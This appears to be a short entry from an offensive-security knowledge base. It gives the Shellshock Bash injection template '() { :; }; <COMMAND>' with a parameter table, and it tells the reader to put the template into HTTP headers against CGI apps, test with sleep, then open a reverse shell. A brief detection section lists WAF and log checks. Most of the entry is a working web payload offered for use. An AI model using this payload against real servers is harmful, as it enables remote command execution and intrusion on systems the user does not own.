---
id: 8c67144b-b446-40d8-a359-82bfcb57bb5a
type: code
language: bash
verified: true
created_at: '2019-10-10T21:06:32.206832+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Linux
tags:
  - shellshock
  - payload
validated: true
---

# Shellshock-Payload-Template

## Code

```bash
() { :; }; <COMMAND>
```

## Description

Basic template for Shellshock injection; defines a function in env var to execute arbitrary commands via Bash vulnerability.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <COMMAND> | Payload to execute | /bin/sleep 10 |

## Usage

Substitute into HTTP headers for CGI exploitation; test with sleep, then reverse shell.

## Detection

- WAF rules for () { :; }; patterns
- Bash audit logs for anomalous executions
- Network logs for delayed responses

## Related

- [[procedures/Exploit-Shellshock-on-Vulnerable-Web-App]]
